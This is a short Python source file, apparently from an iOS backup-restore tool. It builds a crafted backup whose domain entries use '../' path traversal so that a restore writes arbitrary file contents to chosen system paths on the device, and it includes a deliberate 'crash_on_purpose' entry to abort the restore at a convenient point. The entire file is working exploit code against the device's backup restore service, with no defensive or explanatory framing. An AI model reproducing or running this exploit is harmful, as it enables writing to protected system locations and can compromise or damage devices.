from . import backup, perform_restore

def restore_file(fp: str, restore_path: str, restore_name: str):
    contents = open(fp, "rb").read()

    back = backup.Backup(files=[
        backup.Directory("", "RootDomain"),
        backup.Directory("Library", "RootDomain"),
        backup.Directory("Library/Preferences", "RootDomain"),
        backup.ConcreteFile("Library/Preferences/sparsetemp", "RootDomain", owner=33, group=33, contents=contents, inode=0),
        backup.Directory("", f"SysContainerDomain-../../../../../../../../var/.backup.i{restore_path}", owner=33, group=33),
        backup.ConcreteFile("", f"SysContainerDomain-../../../../../../../../var/.backup.i{restore_path}{restore_name}", owner=33, group=33, contents=b"", inode=0),
        backup.ConcreteFile("", "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/sparsetemp", contents=b""),
        backup.ConcreteFile("", "SysContainerDomain-../../../../../../../.." + "/crash_on_purpose", contents=b"")
    ])

    perform_restore(backup=back)
